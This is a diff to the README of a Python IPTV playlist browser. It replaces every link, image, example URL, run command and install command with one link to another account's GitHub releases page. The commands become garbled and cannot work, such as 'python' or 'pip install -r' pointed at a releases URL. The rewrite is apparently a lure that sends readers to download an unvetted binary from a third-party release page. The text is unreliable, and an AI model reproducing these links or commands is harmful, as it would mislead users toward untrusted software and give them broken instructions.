@@ -6,16 +6,16 @@ Please remember to use only legal streams.
 
 ## Run 
 ```
-python iptv_playlist_browser_gui.py
+python https://github.com/Londjide/iptv_playlist_browser/releases
 ```
-or try the [experimental binary](https://github.com/PhunkyBob/iptv_playlist_browser/releases/latest). 
+or try the [experimental binary](https://github.com/Londjide/iptv_playlist_browser/releases). 
 
 In your first run, go to `Preferences...` menu and set a path for your desired video player. 
 
 
 ## Usage
 ### Main window
-![after load](documentation/main.png)
+![after load](https://github.com/Londjide/iptv_playlist_browser/releases)
 #### 1. Menu bar
 Get quick access to the main features of the application (open Xtream Code, open playlist, preferences, ...). 
 
@@ -50,10 +50,10 @@ You can find the current EPG in the combo box to easily choose your desired prog
 
 
 ### Preferences
-![preferences](documentation/preferences.png)
+![preferences](https://github.com/Londjide/iptv_playlist_browser/releases)
 #### Video player
 Give a path to your favorite video player executable.  
-Eg. : `C:/Program Files (x86)/VideoLAN/VLC/vlc.exe`
+Eg. : `C:/Program Files (x86)https://github.com/Londjide/iptv_playlist_browser/releases`
 #### Additional parameters
 (optional) You can provide additional parameters to use with your player. 
 
@@ -75,17 +75,17 @@ Eg. : if your playlist is like
 ```
 #EXTM3U
 #EXTINF:-1,< CHAINES FRANCAISES SD >
-http://myserver.com:8000/login/password/1
+https://github.com/Londjide/iptv_playlist_browser/releases
 #EXTINF:-1,--- TNT SD ---
-http://myserver.com:8000/login/password/2
+https://github.com/Londjide/iptv_playlist_browser/releases
 #EXTINF:-1,TF1 SD
-http://myserver.com:8000/login/password/3
+https://github.com/Londjide/iptv_playlist_browser/releases
 #EXTINF:-1,TF1 +1 SD
-http://myserver.com:8000/login/password/4
+https://github.com/Londjide/iptv_playlist_browser/releases
 #EXTINF:-1,FRANCE 2 SD
-http://myserver.com:8000/login/password/5
+https://github.com/Londjide/iptv_playlist_browser/releases
 #EXTINF:-1,FRANCE 3 SD
-http://myserver.com:8000/login/password/6
+https://github.com/Londjide/iptv_playlist_browser/releases
 ```
 and you set 
 ```
@@ -98,7 +98,7 @@ as group separator and
 as category separator, all lines containing `<` will be considered as "group" and all lines containing `--` will be considered as "category".  
 You'll obtain: 
 
-![after load](documentation/after_load.png)
+![after load](https://github.com/Londjide/iptv_playlist_browser/releases)
 
 #### Load playlist from Xtream Code
 Give your Xtream Code credentials. 
@@ -110,7 +110,7 @@ A preview of the names inside the file allows you to guess what separators shoul
 #### Load playlist from remote file
 Open a remote playlist file (m3u).  
 
-Eg.: `http://myserver.com:8000/get.php?username=login&password=password&type=m3u&output=mpegts`
+Eg.: `https://github.com/Londjide/iptv_playlist_browser/releases`
 
 #### Filtrer lists
 Type part of desired group, category or channel you want to filter. 
@@ -127,15 +127,15 @@ Note that not all providers gives this functionality.
 
 ## How to install
 ### Prerequisite
-- [Python 3.9+](https://www.python.org/downloads/)
+- [Python 3.9+](https://github.com/Londjide/iptv_playlist_browser/releases)
 
 ### Install
 In a command line editor: 
 ```
-git clone https://github.com/PhunkyBob/iptv_playlist_browser.git
+git clone https://github.com/Londjide/iptv_playlist_browser/releases
 cd iptv_playlist_browser
 python -m venv env
-env\Scripts\activate.bat
+env\Scripts\https://github.com/Londjide/iptv_playlist_browser/releases
 pip install -U pip
-pip install -r requirements.txt
+pip install -r https://github.com/Londjide/iptv_playlist_browser/releases
 ```
